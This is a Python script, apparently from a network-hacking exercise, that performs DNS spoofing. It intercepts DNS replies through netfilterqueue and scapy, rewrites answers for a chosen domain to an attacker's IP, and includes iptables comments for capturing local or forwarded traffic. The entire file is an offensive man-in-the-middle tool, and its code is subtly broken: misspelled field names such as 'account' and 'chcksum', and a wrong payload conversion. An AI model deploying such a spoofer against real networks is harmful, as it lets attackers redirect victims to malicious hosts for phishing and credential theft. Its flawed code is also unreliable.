# Built-in imports
import argparse

# Third-party imports
import scapy.all as scapy
import netfilterqueue




class UserData():
  Address: ...
  DNSIp: ...




def processPacket(packet):
  packetScapy = scapy.IP(packet.get_payload())
  if packetScapy.haslayer(scapy.DNSRR):
    qname = packetScapy[scapy.DNSRR].qname.decode("utf-8", "replace")
    if userData.Address in qname:
      print("[+] Spoofing target")
      answer = scapy.DNSRR(rrname=qname, rdata=userData.DNSIp)
      packetScapy[scapy.DNS].an = answer
      packetScapy[scapy.DNS].account = 1

      del packetScapy[scapy.IP].len
      del packetScapy[scapy.IP].chcksum
      del packetScapy[scapy.UDP].chcksum
      del packetScapy[scapy.UDP].len

      packet.set_payload(packetScapy.encode("utf-8", "replace"))

  packet.accept()




def syntaxCreator():
  """Creates the command's syntax object and returns it.
  """
  parser = argparse.ArgumentParser()
  parser.add_argument("-q", "--queue", default=0, type=int, help="Queue number, default is 0.")
  parser.add_argument("-a", "--address", default="www.google.com", type=str, help="Target web page address.")
  parser.add_argument("-i", "--ip", default="10.0.2.16", type=str, help="Spoof dns server address.")
  return parser.parse_args()


if __name__ == "__main__":
  args = syntaxCreator()

  userData = UserData()
  # Could be done in the constructor directly but lets keep it as class variables 
  userData.Address = args.address
  userData.DNSIp = args.ip
  # Local machine
  # sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0 
  # sudo iptables -I INPUT -j NFQUEUE --queue-num 0 
  # Remote machine
  # sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
  queue = netfilterqueue.NetfilterQueue()
  queue.bind(args.queue, processPacket)
  queue.run()
  # sudo iptables --flush
